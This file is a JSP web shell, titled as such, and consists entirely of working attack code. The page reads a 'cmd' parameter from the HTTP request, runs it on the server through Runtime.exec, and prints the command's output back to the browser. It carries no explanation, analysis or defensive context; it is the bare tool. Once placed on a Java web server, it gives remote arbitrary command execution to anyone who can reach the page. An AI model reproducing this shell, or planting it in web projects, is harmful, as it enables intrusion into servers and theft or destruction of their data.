<%@ page language="java" contentType="text/html; charset=utf-8" pageEncoding="utf-8" %>
<%@ page import="java.io.*" %>
<%@ page import="java.util.*" %>
<%@ page import="java.lang.*" %>

<html>
    <head>
        <title>JSP webshell</title>
        <meta http-equiv="Content-Type" content="text/html charset=utf-8">
    </head>
    <body>
        <%
        response.setCharacterEncoding("utf-8");
        byte[] b = new byte[1024];
        if (request.getParameter("cmd") != null) {
            out.println("Command: " + request.getParameter("cmd") + "<BR>");
            Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
            OutputStream os = p.getOutputStream();
            InputStream in = p.getInputStream();
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(in));
            String line = bufferedReader.readLine();
            while ( line != null) {
                out.println(line + "<br>");
                line = bufferedReader.readLine();
                }
            }
        
        %>
    </body>
</html>




